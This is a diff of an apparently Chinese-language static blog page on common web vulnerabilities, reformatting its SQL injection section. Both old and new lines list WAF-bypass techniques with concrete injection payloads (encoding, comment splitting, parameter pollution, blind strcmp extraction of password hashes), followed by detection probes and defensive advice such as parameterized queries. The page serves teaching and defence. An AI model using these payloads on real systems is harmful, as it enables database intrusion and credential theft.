@@ -92,7 +92,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/01/30/常见Web漏洞类型/常见Web漏洞的检测与防御方法/4.png">
 <meta property="og:image" content="http://yoursite.com/2019/01/30/常见Web漏洞类型/常见Web漏洞的检测与防御方法/5.png">
 <meta property="og:image" content="http://yoursite.com/2019/01/30/常见Web漏洞类型/常见Web漏洞的检测与防御方法/2.png">
-<meta property="og:updated_time" content="2019-01-30T16:03:32.753Z">
+<meta property="og:updated_time" content="2019-01-30T16:13:09.866Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="常见Web漏洞类型">
 <meta name="twitter:description" content="这里小结一下常见的Web漏洞类型，待完善。 SQL注入与SQL盲注一、基本概念背景介绍 ​    结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。1986年10月，美国国家标准学会对SQL进行规范后，以此作为关系式数据库管理系统的标准语言（ANSI X3. 135-1986），1987年得到国际标准组织的支持">
@@ -441,81 +441,65 @@
 <hr>
 <p><strong>危害</strong></p>
 <p>　　攻击者利用SQL注入漏洞，可以获取数据库中的多种信息（例如：管理员后台密码），从而脱取数据库中内容（脱库）。在特别情况下还可以修改数据库内容或者插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者可以通过SQL注入漏洞直接获取webshell或者服务器系统权限。</p>
-<h2 id="二、绕过WAF的方法"><a href="#二、绕过WAF的方法" class="headerlink" title="二、绕过WAF的方法"></a>二、绕过WAF的方法</h2><ol>
-<li><p>大小写绕过</p>
-</li>
-<li><p>简单编码绕过</p>
-</li>
-<li><p>注释绕过：</p>
-</li>
-</ol>
-<p>如?id=1 uni/<strong>/on sele/</strong>/ct 1,2,3 # </p>
-<ol start="4">
-<li>分隔重写绕过：</li>
-</ol>
-<p>适用于WAF采用正则表达式检测所有的敏感字的情况，可以通过注释分开敏感字，如?id=1 un//ion sel//ect 1,2,3 #；至于重写绕过，适用于WAF过滤了一次的情况，如uniunionon，有时候可能还有多次过滤的情况，这时多次尝试也可以。</p>
-<ol start="5">
-<li>HTTP参数污染(HPP)： </li>
-</ol>
-<p>如?id=1 union select 1,2,3 from users where id=1 # </p>
-<p>这时可以改为?id=1 union select 1&amp;id=2,3 from users where id=1 # </p>
-<p>次数&amp;id=会在查询时变成逗号，具体细节取决于 WAF ；</p>
-<p>这个例子也同理：?id=1/<em>/union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=</em>/users # </p>
-<p>如果服务器代码为： select <em> from table where a=”.$_GET[‘a’].” and b=”.$_GET[‘b’].” limit “.$_GET[‘c’]; 那么可以构造这样的注入语句： ?a=1 union/&amp;b=/select 1,pass/&amp;c=/from users # 最终解析为： select from table where a=1 union/ and b=/select 1,pass/limit </em>/from users # 可以看到，这种方式比较适合白盒测试。</p>
-<ol start="6">
-<li>使用逻辑运算符 or /and 绕过：</li>
-</ol>
-<p>如?id=1 or 0x50=0x50 </p>
-<p>?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74，其中select pwd from users limit 1,1是从 users 表里查询 pwd 字段的第一条记录， 然后 mid()就是取该记录的第一个字符， lower()把字符转换为小写，  ascii 把 该字符转换成 ascii 码，最后判断等不等于 74。</p>
-<ol start="7">
-<li><p>比较操作符替换：比较操作符如!=、&lt;&gt;、&lt;、&gt;都可以用来替换=来绕过。</p>
-</li>
-<li><p>同功能函数替换：</p>
-</li>
-</ol>
-<p>substring()可以用mid()、substr()这些函数来替换，都是用来取字符串的某一位字符的；</p>
-<p>ascii()编码可以用 hex()、bin()，即十六进制和二进制编码替换；</p>
-<p>在使用在基于延时的盲注中benchmark()和sleep()可以相互替换；</p>
-<p>group_concat 、 concat 、concat_ws 三者可以互相替换；</p>
-<p>还有一种新的方法 ，3条语句分别如下</p>
-<p>substring((select ‘password’),1,1) = 0x70</p>
-<p>substr((select ‘password’),1,1) = 0x70</p>
-<p>mid((select ‘password’),1,1) = 0x70 </p>
-<p>都是从 password 里判断第一个字符的值，可以用 </p>
-<p>strcmp(left(‘password’,1), 0x69) = 1</p>
-<p>strcmp(left(‘password’,1), 0x70) = 0</p>
-<p>strcmp(left(‘password’,1), 0x71) = -1 </p>
-<p>替换，left 用来取字符串左起 1 位的值，strcmp 用来比较两个值，如果比较结果相等就为 0，左边小的话就为-1，否则为 1。</p>
-<ol start="9">
-<li>盲注无需or和and：</li>
-</ol>
-<p>例句：index.php?id=1</p>
-<p>当and和or被过滤时，可以将 1修改为是通过语句生成的， index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123，123 的时候页面是正确的，现在再盲猜 hash 的第一位，如果第一位等于 0x42 也就是 B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是 B，就这样猜，不用 and 和 or 了。</p>
-<ol start="10">
-<li>加括号：</li>
-</ol>
-<p>如?id=(1)union(select(1),mid(hash,1,32)from(users))   </p>
-<p>?id=(1)union(((((((select(1),hex(hash)from(users))))))))</p>
-<p>?id=(1)or(0x50=0x50)</p>
-<p>11.缓冲区溢出绕过：</p>
-<p>如id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10 #</p>
-<p>其中 A 越多越好，一般要求 1000 个以上。</p>
-<h2 id="三、检测方法"><a href="#三、检测方法" class="headerlink" title="三、检测方法"></a>三、检测方法</h2><p>1、基于报错的检测方法：</p>
+<h2 id="二、绕过WAF的方法"><a href="#二、绕过WAF的方法" class="headerlink" title="二、绕过WAF的方法"></a>二、绕过WAF的方法</h2><p><strong>1、大小写绕过</strong></p>
+<p>​    如：?id=1’ uNiOn SElecT * FrOm users #</p>
+<p><strong>2、简单编码绕过</strong></p>
+<p>​    如URL编码、双重URL编码、Hex编码、Unicode编码等。</p>
+<p>​    ?id=1%252f%252a*/UNION%252f%252a /SELECT</p>
+<p>​    id=-15 /<em>!u%6eion</em>/ /<em>!se%6cect</em>/ 1,2,3,4…</p>
+<p>​    ?id=10%D6‘%20AND%201=2%23</p>
+<p>​    SELECT ‘Ä’=’A’; #1    </p>
+<p><strong>3、注释绕过</strong></p>
+<p>​    如?id=1 uni/<strong>/on sele/</strong>/ct 1,2,3 # </p>
+<p><strong>4、分隔重写绕过</strong></p>
+<p>​    适用于WAF采用正则表达式检测所有的敏感字的情况，可以通过注释分开敏感字，如?id=1 un//ion sel//ect 1,2,3 #；至于重写绕过，适用于WAF过滤了一次的情况，如uniunionon，有时候可能还有多次过滤的情况，这时多次尝试也可以。</p>
+<p><strong>5、HTTP参数污染(HPP)：</strong></p>
+<p>​    如?id=1 union select 1,2,3 from users where id=1 # </p>
+<p>​    这时可以改为?id=1 union select 1&amp;id=2,3 from users where id=1 # </p>
+<p>​    次数&amp;id=会在查询时变成逗号，具体细节取决于 WAF ；</p>
+<p>​    这个例子也同理：?id=1/<em>/union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=</em>/users # </p>
+<p>​    如果服务器代码为： select <em> from table where a=”.$_GET[‘a’].” and b=”.$_GET[‘b’].” limit “.$_GET[‘c’]; 那么可以构造这样的注入语句： ?a=1 union/&amp;b=/select 1,pass/&amp;c=/from users # 最终解析为： select from table where a=1 union/ and b=/select 1,pass/limit </em>/from users # 可以看到，这种方式比较适合白盒测试。</p>
+<p><strong>6、使用逻辑运算符 or /and 绕过</strong></p>
+<p>​    如?id=1 or 0x50=0x50 </p>
+<p>​    ?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74，其中select pwd from users limit 1,1是从 users 表里查询 pwd 字段的第一条记录， 然后 mid()就是取该记录的第一个字符， lower()把字符转换为小写，  ascii 把 该字符转换成 ascii 码，最后判断等不等于 74。</p>
+<p><strong>7、比较操作符替换</strong></p>
+<p>​    比较操作符如!=、&lt;&gt;、&lt;、&gt;都可以用来替换=来绕过。</p>
+<p><strong>8、同功能函数替换</strong></p>
+<p>​    substring()可以用mid()、substr()这些函数来替换，都是用来取字符串的某一位字符的；</p>
+<p>​    ascii()编码可以用 hex()、bin()，即十六进制和二进制编码替换；</p>
+<p>​    在使用在基于延时的盲注中benchmark()和sleep()可以相互替换；</p>
+<p>​    group_concat 、 concat 、concat_ws 三者可以互相替换；</p>
+<p>​    还有一种新的方法 ，3条语句分别如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">substring((<span class="keyword">select</span> ‘<span class="keyword">password</span>’),<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x70</span></span><br><span class="line"><span class="keyword">substr</span>((<span class="keyword">select</span> ‘<span class="keyword">password</span>’),<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x70</span></span><br><span class="line"><span class="keyword">mid</span>((<span class="keyword">select</span> ‘<span class="keyword">password</span>’),<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x70</span></span><br></pre></td></tr></table></figure>
+<p>​    都是从 password 里判断第一个字符的值，可以用 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strcmp(left(‘password’,1), 0x69) = 1</span><br><span class="line">strcmp(left(‘password’,1), 0x70) = 0</span><br><span class="line">strcmp(left(‘password’,1), 0x71) = -1</span><br></pre></td></tr></table></figure>
+<p>​    替换，left 用来取字符串左起 1 位的值，strcmp 用来比较两个值，如果比较结果相等就为 0，左边小的话就为-1，否则为 1。</p>
+<p><strong>9、盲注无需or和and</strong></p>
+<p>​    例句：index.php?id=1</p>
+<p>​    当and和or被过滤时，可以将 1修改为是通过语句生成的， index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123，123 的时候页面是正确的，现在再盲猜 hash 的第一位，如果第一位等于 0x42 也就是 B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是 B，就这样猜，不用 and 和 or 了。</p>
+<p><strong>10、加括号</strong></p>
+<p>​    如?id=(1)union(select(1),mid(hash,1,32)from(users))   </p>
+<p>​    ?id=(1)union(((((((select(1),hex(hash)from(users))))))))</p>
+<p>​    ?id=(1)or(0x50=0x50)</p>
+<p><strong>11、缓冲区溢出绕过</strong></p>
+<p>​    如id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10 #</p>
+<p>​    其中 A 越多越好，一般要求 1000 个以上。</p>
+<h2 id="三、检测方法"><a href="#三、检测方法" class="headerlink" title="三、检测方法"></a>三、检测方法</h2><p><strong>1、基于报错的检测方法</strong></p>
 <p>使用各种符号以及组合： ‘  “  (  %</p>
 <p>如直接在URL后添加单引号看是否报错index.php?id=1’</p>
-<p>2、基于布尔的检测：</p>
+<p><strong>2、基于布尔的检测</strong></p>
 <p>最常用的如1’ and ‘1’=’1和1’ and ‘1’=’2 相当于 1’ and ‘1和1’ and ‘0</p>
 <p>当返回的结果不同时即有漏洞</p>
-<p>3、直接在URL地址后面加-1、-0、’%2B’和’%2B’a：</p>
+<p><strong>3、直接在URL地址后面加-1、-0、’%2B’和’%2B’a</strong></p>
 <p>添加-1：index.php?id=123-1，当前后访问的页面不同时，即可确定存在数字型SQL注入漏洞；</p>
 <p>添加-0：index.php?id=123-0，当前后访问的页面相同时，再加上-1，返回错误页面，则表示存在数字型SQL注入漏洞；</p>
 <p>添加’%2B’和’%2B’a：这里%2B为‘+’的URL编码，当先添加’%2B’时index.php?id=123’%2B’返回同样的页面，而添加’%2B’a时返回错误，这种适用于SQL语句中id值被一对单引号括起来的情况。</p>
-<p>4、判断盲注的常用方法：</p>
+<p><strong>4、判断盲注的常用方法</strong></p>
 <p>1’ and 1=1 #  </p>
 <p>1’ and 1=2 #  </p>
 <p>判断这两种不同的输入是否有不一样的显示，如果一个正常一个通用的错误提示或者啥也不显示，则几乎可以确定是含有SQL注入漏洞的。</p>
 <h2 id="四、防御方法"><a href="#四、防御方法" class="headerlink" title="四、防御方法"></a>四、防御方法</h2><p>关键是对所有用户的输入进行严格的检查过滤、对数据库配置使用最小权限原则。</p>
-<p>常用的修复方案：</p>
+<p><strong>常用的修复方案</strong></p>
 <p>（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。</p>
 <p>（2）过滤危险的 SQL 语句关键字。</p>
 <p>（3）确认每种数据的类型。</p>
